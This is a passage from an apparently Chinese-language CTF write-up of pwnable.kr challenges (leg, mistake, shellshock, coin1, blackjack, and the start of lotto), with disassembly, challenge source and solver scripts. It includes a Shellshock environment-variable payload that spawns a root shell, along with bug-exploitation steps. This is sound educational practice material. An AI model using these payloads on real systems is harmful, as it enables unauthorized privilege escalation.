r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:    ldr    r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:    cmp    r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:    bne    0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:    ldr    r0, [pc, #44]    ; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:    bl    0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:    ldr    r0, [pc, #40]    ; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:    bl    0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:    b    0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:    ldr    r0, [pc, #32]    ; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:    bl    0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:    mov    r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:    mov    r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:    sub    sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:    pop    &#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:    andeq    r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:    andeq    r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:    andeq    r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:    mov    r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:    mov    r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:    push    &#123;r6&#125;        ; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:    bx    r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:    mov    r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:    pop    &#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:    pop    &#123;r6&#125;        ; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:    mov    r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很明显可以看到 0x00008d8c 处的 cmp 是在比较三个 key 函数的返回值和我们输入的数字是否相同。arm 的函数返回值最终放在 r0 里，那么我们就需要找调用完这几个 key 以后 r0 里都是什么。首先 0x00008d68 调用 key1，调转到 0x00008cd4，我们只关注 r0，r0 来自 r3，而 r3 来自 pc，pc 中保存的是下一条要执行的指令地址，arm 的指令长度为 4，pc 中保存的也就是当前指令 +8 处的地址，所以在 0x00008cdc 处的 pc 的值应该就是 0x00008ce4，所以 key1 的返回值为 0x00008ce4。</p><p>执行完 key1 在回到 0x00008d6c，将 key1 点返回值 r0 放入 r4 中，接着由执行 key2，跳转到 0x00008cf0。首先保存 r6，然后把 pc+1 保存到 r6 中，然后跳转到 r6，也就是跳转到 0x00008d05，由于最低位是 1，则 bx 跳转到 0x00008d04，并且切换到 thumb 状态，然后将 pc 放入 r3 中，由于 thumb 状态指令长度为 2，因此 r3 为 0x00008d08，再加 4，就变成了 0x00008d0c，然后一个 push 一个 pop 把 r3 放入 pc 中，pc 变成了 0x00008d0c，跳转到 0x00008d0c 处，再 pop 恢复 r6，然后把 r3 放入 r0 最为返回值，因此最后的返回值 r0 为 0x00008d0c。</p><p>执行完 key2 后状态切换为 arm 态，将 key2 的返回值放入 r3 中，和 key1 的返回值加起来放入 r4，然后跳转到 key3 的位置 0x00008d20。key3 里直接把 lr 放入 r3，再把 r3 放入 r0 返回，而 lr 中保存的是 key3 的返回地址，也就是执行完 key3 要返回的地址，就是 0x00008d80，因此 key3 的返回值为 0x00008d80。这三个数加起来就是 108400，也就是最后的结果。</p><h1 id="mistake-1-pt"><a href="#mistake-1-pt" class="headerlink" title="mistake (1 pt)"></a>mistake (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        s[i] ^= XORKEY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">    sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// xor your input</span></span><br><span class="line">    xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目提示是运算符优先级第问题，而源码第 17 行又一个很明显的错误<code>fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>，这里有一个连用的运算符并且没有加括号，等号的优先级通常来说是最低的，因此这行代码等价于<code>fd=(open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>，而 open 返回值肯定不会小于 0，所以 fd 这时就会被赋值为 0，程序后面的 read 用 fd 读取 password 的时候，fd 是 0 就代表从标准输入里读取，这时候 password 是什么就不重要了，因为我们可以控制 password 的值，只要连续输入两个字符串，一个是另一个的 xor 版本就可以了，exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">s</span>):</span><br><span class="line">    x = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        x += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xor(<span class="string">&#x27;1234567890&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先输入 1234567890，然后输入 0325476981，0325476981 是 1234567890 的 xor 结果，这样就可以拿到 flag。</p><h1 id="shellshock-1-pt"><a href="#shellshock-1-pt" class="headerlink" title="shellshock (1 pt)"></a>shellshock (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setresuid(getegid(), getegid(), getegid());</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());</span><br><span class="line">    system(<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很简单的 shellshock 漏洞的利用，网上有很多 payload，在 bash 输入以下 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> gu=<span class="string">&#x27;() &#123; :;&#125;;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>然后执行 shellshock 程序，就可以拿到一个 root 的 shell，直接读 flag 即可。</p><h1 id="coin1-6-pt"><a href="#coin1-6-pt" class="headerlink" title="coin1 (6 pt)"></a>coin1 (6 pt)</h1><p>这是一个编程题，没给源码，没给程序，是一个算法题。题目会给一定数量 (N) 的金币，每个金币的重量为 10，但是其中有一个假金币，假金币的重量为 9，题目会给一定的称重次数(C)，每次可以选择不同序号的金币称重获得总重量，在称重次数用完以后就需要给出假金币的序号，在一分钟内一共猜中 100 次假金币的序号才会给 flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">-              Shall we play a game?              -</span><br><span class="line">---------------------------------------------------</span><br><span class="line"></span><br><span class="line">You have given some gold coins in your hand</span><br><span class="line">however, there is one counterfeit coin among them</span><br><span class="line">counterfeit coin looks exactly same as real coin</span><br><span class="line">however, its weight is different from real one</span><br><span class="line">real coin weighs 10, counterfeit coin weighes 9</span><br><span class="line">help me to find the counterfeit coin with a scale</span><br><span class="line">if you find 100 counterfeit coins, you will get reward :)</span><br><span class="line">FYI, you have 60 seconds.</span><br><span class="line"></span><br><span class="line">- How to play -</span><br><span class="line">1. you get a number of coins (N) and number of chances (C)</span><br><span class="line">2. then you specify a set of index numbers of coins to be weighed</span><br><span class="line">3. you get the weight information</span><br><span class="line">4. 2~3 repeats C time, then you give the answer</span><br><span class="line"></span><br><span class="line">- Example -</span><br><span class="line">[Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial</span><br><span class="line">[Client] 0 1         # weigh first and second coin</span><br><span class="line">[Server] 20            # scale result : 20</span><br><span class="line">[Client] 3            # weigh fourth coin</span><br><span class="line">[Server] 10            # scale result : 10</span><br><span class="line">[Client] 2             # counterfeit coin is third!</span><br><span class="line">[Server] Correct!</span><br><span class="line"></span><br><span class="line">- Ready? starting in 3 sec... -</span><br></pre></td></tr></table></figure><p>这种类型的题目可以用二分法来解，对二分法来说，题目给的称重次数是肯定够用的，先称左半部分，重量是否是预期的重量（即总重量 = 数量 *10），否则假金币就在右半部分，以此类推直到最后只剩下一个金币。</p><p>最终的 exp 如下，由于远程连接比较慢，一分钟只能跑 20 多次，所以需要上传到服务器去跑，随便找个以前的题目，去 tmp 目录下跑就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">HOST = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">PORT = <span class="number">9007</span></span><br><span class="line"></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">start, end</span>):</span><br><span class="line">    rg = [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end)]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> rg:</span><br><span class="line">        rg = [<span class="built_in">str</span>(start)]</span><br><span class="line">    conn.sendline(<span class="string">&#x27; &#x27;</span>.join(rg))</span><br><span class="line">    result = <span class="built_in">int</span>(conn.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">return</span> result != <span class="built_in">len</span>(rg) * <span class="number">10</span></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;N=&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    conn.recvuntil(<span class="string">&#x27;N=&#x27;</span>)</span><br><span class="line">    line = conn.recvline()</span><br><span class="line">    t = line.split()</span><br><span class="line">    N = <span class="built_in">int</span>(t[<span class="number">0</span>])</span><br><span class="line">    C = <span class="built_in">int</span>(t[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    log.info(<span class="string">&#x27;N=%d C=%d&#x27;</span> % (N, C))</span><br><span class="line"></span><br><span class="line">    left, right = <span class="number">0</span>, N</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(C):</span><br><span class="line">        mid = (right + left) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># log.info(&#x27;Count: %d/%d&#x27; % (i+1, C))</span></span><br><span class="line">        <span class="comment"># log.info(&#x27;%d %d %d&#x27; % (left, mid, right))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> send(left, mid):</span><br><span class="line">                <span class="comment"># Coin in here.</span></span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="comment"># Find it.</span></span><br><span class="line">            <span class="comment"># log.info(&#x27;Find %d&#x27; % left)</span></span><br><span class="line">            l = C-i-<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> l &lt; <span class="number">0</span>:</span><br><span class="line">                log.error(<span class="string">&#x27;Not enough count!&#x27;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">                send(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">            conn.sendline(<span class="built_in">str</span>(left))</span><br><span class="line">            ret = conn.recvline()</span><br><span class="line">            <span class="keyword">assert</span> <span class="string">&#x27;Correct&#x27;</span> <span class="keyword">in</span> ret</span><br><span class="line">            log.success(ret)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># log.info(&#x27;Find %d&#x27; % mid)</span></span><br><span class="line">        conn.sendline(<span class="built_in">str</span>(mid))</span><br><span class="line">        ret = conn.recvline()</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">&#x27;Correct&#x27;</span> <span class="keyword">in</span> ret</span><br><span class="line">        log.success(ret)</span><br><span class="line"></span><br><span class="line">log.success(conn.recvline())</span><br><span class="line">log.success(conn.recvline())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="blackjack-1-pt"><a href="#blackjack-1-pt" class="headerlink" title="blackjack (1 pt)"></a>blackjack (1 pt)</h1><p>和上一题一样，没给源码没给程序，看规则应该是一个类似 21 点的游戏，游戏开始只有 500$，可以下赌注，如果点数超过 21 点就输了，目标是获得 1000,000$。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">           RULES of VLAD&#x27;s BLACKJACK</span><br><span class="line">          ---------------------------</span><br><span class="line">I.</span><br><span class="line">     Thou shalt not question the odds of this game.</span><br><span class="line">      S This program generates cards at random.</span><br><span class="line">      D If you keep losing, you are very unlucky!</span><br><span class="line"></span><br><span class="line">II.</span><br><span class="line">     Each card has a value.</span><br><span class="line">      S Number cards 1 to 10 hold a value of their number.</span><br><span class="line">      D J, Q, and K cards hold a value of 10.</span><br><span class="line">      C Ace cards hold a value of 11</span><br><span class="line">     The goal of this game is to reach a card value total of 21.</span><br><span class="line"></span><br><span class="line">III.</span><br><span class="line">     After the dealing of the first two cards, YOU must decide whether to HIT or STAY.</span><br><span class="line">      S Staying will keep you safe, hitting will add a card.</span><br><span class="line">     Because you are competing against the dealer, you must beat his hand.</span><br><span class="line">     BUT BEWARE!.</span><br><span class="line">      D If your total goes over 21, you will LOSE!.</span><br><span class="line">     But the world is not over, because you can always play again.</span><br><span class="line"></span><br><span class="line">SHC YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM CHS</span><br><span class="line"></span><br><span class="line">Would you like to go the previous screen? (I will not take NO for an answer)</span><br><span class="line">                  (Y/N)</span><br><span class="line">                    </span><br></pre></td></tr></table></figure><p>其实看了半天也没太看懂算分的规则，但是不重要。首先需要输入你的赌注，赌注可以输入负数，所以只要玩输了就会赚，不知道为什么， 有时候赌注输入的负数太大了（没有溢出）最后就说我破产了，所以一点点十几万的往上加赌注，一直输，知道赢了 100 万就拿到 flag 了。</p><h1 id="lotto-2-pt"><a href="#lotto-2-pt" class="headerlink" title="lotto (2 pt)"></a>lotto (2 pt)</h1><p>这次的题目也是个 游戏，给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// generate lotto numbers</span></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 